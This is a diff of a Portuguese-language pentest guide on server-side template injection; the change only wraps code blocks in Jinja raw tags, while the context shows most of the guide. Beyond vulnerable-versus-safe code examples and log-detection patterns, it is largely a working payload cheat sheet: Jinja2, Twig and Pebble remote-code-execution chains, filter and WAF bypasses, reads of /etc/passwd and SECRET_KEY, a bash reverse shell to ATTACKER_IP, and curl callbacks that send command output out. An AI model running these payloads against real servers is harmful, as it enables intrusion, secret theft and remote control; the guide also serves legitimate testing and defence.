@@ -157,6 +157,7 @@ O fluxo correto de uso de um template engine mantém uma separação rígida ent
 
 **Exemplo Jinja2 (Python/Flask) — correto vs. inseguro:**
 
+{% raw %}
 ```python
 from flask import Flask, request, render_template, render_template_string
 from jinja2 import Environment, select_autoescape
@@ -180,9 +181,11 @@ def saudacao_insegura():
     return render_template_string(f'Bem-vindo, {nome}!')
     # Se nome = "{{config.SECRET_KEY}}", saida: valor real da SECRET_KEY
 ```
+{% endraw %}
 
 **Exemplo Twig (PHP/Symfony) — correto vs. inseguro:**
 
+{% raw %}
 ```php
 // CORRETO: template em arquivo .twig separado
 // O arquivo templates/email.html.twig contém: <p>Olá, {{ nome }}!</p>
@@ -212,6 +215,7 @@ class EmailControllerInseguro extends AbstractController
     }
 }
 ```
+{% endraw %}
 
 **Exemplo FreeMarker (Java/Spring) — correto vs. inseguro:**
 
@@ -317,6 +321,7 @@ A suposição de design incorreta: o desenvolvedor pensa que está manipulando t
 
 **A diferença que importa**:
 
+{% raw %}
 ```python
 # VULNERÁVEL — input inserido diretamente na string do template
 # O engine recebe: "Olá, {{7*7}}!" e avalia a expressão
@@ -330,6 +335,7 @@ template = Template("Olá, {{ name }}!")
 rendered = template.render(name=user_input)
 # Se user_input = "{{7*7}}", resultado: "Olá, {{7*7}}!"
 ```
+{% endraw %}
 
 No modelo seguro, o template é fixo e o input é tratado como dado puro. No modelo vulnerável, o template em si é construído com input do usuário — e o engine executa tudo que encontra entre os delimitadores, independente da origem.
 
@@ -346,6 +352,7 @@ Engines de template distinguem dois tipos de conteúdo:
 
 Quando o desenvolvedor constrói a string do template com input do usuário, o engine não tem como saber qual parte é "código do desenvolvedor" e qual parte é "dado do usuário". Tudo que estiver entre os delimitadores será avaliado.
 
+{% raw %}
 ```python
 # Exemplo concreto com Jinja2
 
@@ -364,7 +371,9 @@ return t.render(name=username)
 # O engine substitui {{name}} pelo valor da variável — não avalia como código
 # Input "{{config.SECRET_KEY}}" seria exibido literalmente
 ```
+{% endraw %}
 
+{% raw %}
 ```php
 // Twig (PHP) — mesmo padrão
 
@@ -378,6 +387,7 @@ $username = $_GET['name'];
 $template = $twig->createTemplate("Olá, {{ name }}!");
 echo $template->render(['name' => $username]);
 ```
+{% endraw %}
 
 O que está faltando: o template deve ser uma constante definida pelo desenvolvedor. O input do usuário deve entrar apenas como variável de contexto, nunca como parte da string do template.
 
@@ -389,11 +399,13 @@ O engine processa dois tipos de conteúdo. Quando input do usuário é inserido 
 
 **Exemplo com Jinja2 (Python/Flask)**:
 
+{% raw %}
 ```
 Template: "Bem-vindo, {{ name }}!"
 Input legítimo: "Alice"    -> Saída: "Bem-vindo, Alice!"
 Input malicioso: "{{7*7}}" -> Saída: "Bem-vindo, 49!"   <- SSTI confirmado
 ```
+{% endraw %}
 
 O engine avaliou `7*7` como expressão matemática, retornando `49`. Isso prova que código arbitrário pode ser executado no contexto do servidor.
 
@@ -405,14 +417,17 @@ O engine avaliou `7*7` como expressão matemática, retornando `49`. Isso prova 
 
 Injete esta string universal para provocar erros em qualquer engine vulnerável:
 
+{% raw %}
 ```
 ${{<%[%'"}}%\.
 ```
+{% endraw %}
 
 Esta string contém delimitadores de todos os principais engines. Se a aplicação retornar um erro interno do servidor (500), é forte indicativo de SSTI.
 
 ### Árvore de Decisão ASCII para Identificar o Engine
 
+{% raw %}
 ```
 Comece injetando: ${7*7}
                        |
@@ -441,14 +456,21 @@ OUTROS ENGINES (testar separadamente):
   *{7*7}      -> 49   = Thymeleaf (Java)
   ${7*7}      -> 49   = FreeMarker / Expression Language (Java)
 ```
+{% endraw %}
 
 ### Payloads de Detecção por Engine
 
 | Payload          | Resultado Esperado | Engine Identificado        |
 |------------------|--------------------|----------------------------|
+{% raw %}
 | `{{7*7}}`        | `49`               | Jinja2, Twig               |
+{% endraw %}
+{% raw %}
 | `{{7*'7'}}`      | `7777777`          | Twig (PHP)                 |
+{% endraw %}
+{% raw %}
 | `{{7*'7'}}`      | `49`               | Jinja2 (Python)            |
+{% endraw %}
 | `${7*7}`         | `49`               | FreeMarker, EL (Java)      |
 | `<%= 7*7 %>`     | `49`               | ERB (Ruby)                 |
 | `#{7*7}`         | `49`               | Pebble, Mako               |
@@ -474,69 +496,87 @@ OUTROS ENGINES (testar separadamente):
 
 #### Reconhecimento - Dump de Configuração
 
+{% raw %}
 ```
 {{ config.items() }}
 {{ config.__class__.__init__.__globals__ }}
 {{ self.__init__.__globals__ }}
 ```
+{% endraw %}
 
 #### Dump de Builtins
 
+{% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__ }}
 ```
+{% endraw %}
 
 #### Leitura de Arquivo Local (LFI)
 
+{% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
+{% endraw %}
 
 #### RCE - Método 1: Via objeto config (Flask)
 
+{% raw %}
 ```
 {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 ```
+{% endraw %}
 
 #### RCE - Método 2: Via request (Flask)
 
+{% raw %}
 ```
 {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
+{% endraw %}
 
 #### RCE - Método 3: Via cycler/joiner/namespace (Sandbox Escape)
 
 Objetos globais do Jinja2 que podem ser usados em ambientes com sandbox:
 
+{% raw %}
 ```
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
 {{ joiner.__init__.__globals__.os.popen('id').read() }}
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
+{% endraw %}
 
 #### RCE - Método 4: Travessia MRO (Method Resolution Order)
 
 O método consiste em navegar pela hierarquia de classes Python para encontrar `subprocess.Popen`:
 
+{% raw %}
 ```
 # Passo 1: Listar todas as subclasses de object
 {{ ''.__class__.__mro__[1].__subclasses__() }}
 ```
+{% endraw %}
 
 Procure na lista por `subprocess.Popen` e anote o índice (exemplo: 258):
 
+{% raw %}
 ```
 # Passo 2: Executar comando via Popen
 {{ ''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0].decode() }}
 ```
+{% endraw %}
 
 Substitua `258` pelo índice correto encontrado na listagem da sua aplicação alvo.
 
 #### Reverse Shell via Jinja2
 
+{% raw %}
 ```
 {{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
 ```
+{% endraw %}
 
 ---
 
@@ -544,36 +584,46 @@ Substitua `258` pelo índice correto encontrado na listagem da sua aplicação a
 
 #### Reconhecimento
 
+{% raw %}
 ```
 {{ _self }}
 {{ _self.env }}
 {{ 7 * 7 }}
 ```
+{% endraw %}
 
 #### LFI via Symfony file_excerpt
 
+{% raw %}
 ```
 {{ "/etc/passwd"|file_excerpt(1,-1) }}
 ```
+{% endraw %}
 
 #### RCE - Método 1: registerUndefinedFilterCallback
 
+{% raw %}
 ```
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 ```
+{% endraw %}
 
 #### RCE - Método 2: filter com system
 
+{% raw %}
 ```
 {{["id"]|filter("system")}}
 {{["id","arg1"]|filter("system")}}
 ```
+{% endraw %}
 
 #### RCE - Método 3: filter com passthru
 
+{% raw %}
 ```
 {{["id"]|filter("passthru")}}
 ```
+{% endraw %}
 
 ---
 
@@ -689,10 +739,12 @@ $str.valueOf($chr.toChars($out.read()))
 
 #### Reconhecimento
 
+{% raw %}
 ```
 {{ 1 + 1 }}
 {{ "test" }}
 ```
+{% endraw %}
 
 #### RCE via Runtime
 
@@ -733,6 +785,7 @@ ${x}
 
 #### Contornar bloqueio de underscore e ponto
 
+{% raw %}
 ```python
 # Usando |attr() do Jinja2 com hex encoding
 {{ ()|attr('\x5f\x5fclass\x5f\x5f') }}
@@ -740,9 +793,11 @@ ${x}
 # Usando request para passar strings bloqueadas como parâmetro GET
 {{ ()|attr(request.args.c) }}?c=__class__
 ```
+{% endraw %}
 
 #### Contornar bloqueio de chaves duplas `{{ }}`
 
+{% raw %}
 ```python
 # Usando blocos condicionais
 {% if config.__class__.__init__.__globals__['os'].popen('id').read() %}ok{% endif %}
@@ -750,9 +805,11 @@ ${x}
 # Usando format string
 {{'%s'|format(config)}}
 ```
+{% endraw %}
 
 #### Bypass via concatenação de strings
 
+{% raw %}
 ```python
 # Concatenar nome de atributo
 {{ ''['__cla'+'ss__'] }}
@@ -760,17 +817,21 @@ ${x}
 # Usar chr() para construir strings proibidas
 {{ ''[request.args.a1]|attr(request.args.a2) }}&a1=__class__&a2=__mro__
 ```
+{% endraw %}
 
 #### Bypass de WAF sem espaços
 
+{% raw %}
 ```python
 {{config.items()}}
 {{(config)['SECRET_KEY']}}
 {{config['SECRET_KEY']}}
 ```
+{% endraw %}
 
 ### Contornar Sandbox Jinja2
 
+{% raw %}
 ```python
 # Listar todos os subclasses para encontrar Popen
 {{ ''.__class__.__mro__[1].__subclasses__() | join('\n') }}
@@ -778,6 +839,7 @@ ${x}
 # Buscar classe específica pelo nome usando loop
 {% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('id',shell=True,stdout=-1).communicate()[0].decode() }}{% endif %}{% endfor %}
 ```
+{% endraw %}
 
 ### Bypass via `attr()` Filter — Filtro de `.__` (AWAE Ch.8 — ERPNext)
 
@@ -785,6 +847,7 @@ Cenário: WAF ou filtro da aplicação bloqueia a string `.__` nos inputs de tem
 
 **Solução**: o filtro nativo Jinja2 `attr(name)` acessa atributos passando o nome como string — sem usar notação ponto. Combinado com `{% set %}` para armazenar nomes de dunders, permite construir a cadeia completa de RCE sem `.__` em nenhum momento.
 
+{% raw %}
 ```python
 {% set class = "__class__" %}
 {% set mro   = "__mro__" %}
@@ -799,12 +862,15 @@ Cenário: WAF ou filtro da aplicação bloqueia a string `.__` nos inputs de tem
 {% set base = ''|attr(class)|attr(mro)|list %}
 {{ base[1]|attr(sub)()[INDICE]('id',shell=True,stdout=-1).communicate()[0].decode() }}
 ```
+{% endraw %}
 
 Identificar o índice correto da classe (subprocess.Popen, os._wrap_close):
+{% raw %}
 ```python
 {# listar subclasses como string para buscar pelo nome #}
 {{ ''|attr(class)|attr(mro)|list|last|attr(sub)()|join('\n') }}
 ```
+{% endraw %}
 
 Caso real: **ERPNext** (AWAE Ch.8) filtrava substring `".__"` literalmente. O bypass com `attr()` contornou o filtro sem alterar a lógica da cadeia.
 
@@ -816,23 +882,29 @@ Quando o output não é refletido na resposta, usar técnicas out-of-band:
 
 #### Time-based (Jinja2) — cause delay perceptível
 
+{% raw %}
 ```python
 # Loop pesado para causar delay
 {{ range(99999999).__class__.__mro__[1].__subclasses__()[258]('sleep 5',shell=True,stdout=-1).communicate() }}
 ```
+{% endraw %}
 
 #### DNS / HTTP Callback (Jinja2)
 
+{% raw %}
 ```python
 # Confirma execução via interactsh ou Burp Collaborator
 {{ config.__class__.__init__.__globals__['os'].popen('curl http://ATTACKER.oast.fun/`id`').read() }}
 ```
+{% endraw %}
 
 #### DNS / HTTP Callback (Twig)
 
+{% raw %}
 ```
 {{["curl http://ATTACKER.oast.fun/`id`"]|filter("system")}}
 ```
+{% endraw %}
 
 #### DNS / HTTP Callback (ERB)
 
@@ -846,20 +918,25 @@ Quando o output não é refletido na resposta, usar técnicas out-of-band:
 
 Nomeie o arquivo com payload e faça upload. Se o servidor renderizar o nome:
 
+{% raw %}
 ```
 {{7*7}}.jpg
 ${7*7}.jpg
 ```
+{% endraw %}
 
 #### Via header HTTP
 
+{% raw %}
 ```bash
 curl -H "X-Forwarded-For: {{7*7}}" https://alvo.com/
 curl -H "User-Agent: {{7*7}}" https://alvo.com/
 ```
+{% endraw %}
 
 ### Exfiltração de Dados Sensíveis (Jinja2/Flask)
 
+{% raw %}
 ```python
 # Dump de todas as configurações (inclui SECRET_KEY)
 {{ config.items() }}
@@ -870,6 +947,7 @@ curl -H "User-Agent: {{7*7}}" https://alvo.com/
 # Listar arquivos do diretório atual
 {{ config.__class__.__init__.__globals__['os'].listdir('.') }}
 ```
+{% endraw %}
 
 ---
 
@@ -934,7 +1012,9 @@ python2 tplmap.py -u "http://alvo.com/?name=test" --os-cmd "id"
 - Scanner automático (Pro) detecta SSTI em muitos engines
 - No Intruder, usar listas de payloads SSTI do SecLists:
   `/usr/share/seclists/Fuzzing/template-injection.txt`
+{% raw %}
 - Fuzz todos os parâmetros com o payload universal: `${{<%[%'"}}%\.`
+{% endraw %}
 - No Repeater, testar payloads manualmente seguindo a árvore de decisão
 
 ### Recursos Externos
@@ -948,6 +1028,7 @@ python2 tplmap.py -u "http://alvo.com/?name=test" --os-cmd "id"
 
 ### Padrões Suspeitos nos Logs de Acesso
 
+{% raw %}
 ```
 # FreeMarker / Expression Language
 \$\{.*\}
@@ -971,6 +1052,7 @@ ${7*7}
 {{config}}
 {{_self}}
 ```
+{% endraw %}
 
 ### Monitoramento de Comportamento Anômalo
 
@@ -1001,6 +1083,7 @@ env = sandbox.SandboxedEnvironment(
 
 ## Referência Rápida de Payloads
 
+{% raw %}
 ```
 # DETECÇÃO UNIVERSAL
 ${{<%[%'"}}%\.
@@ -1047,6 +1130,7 @@ ${__import__('os').popen('id').read()}
 # Pebble - RCE
 {% set cmd = "id" %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(" ")) %}
 ```
+{% endraw %}
 
 ---
 
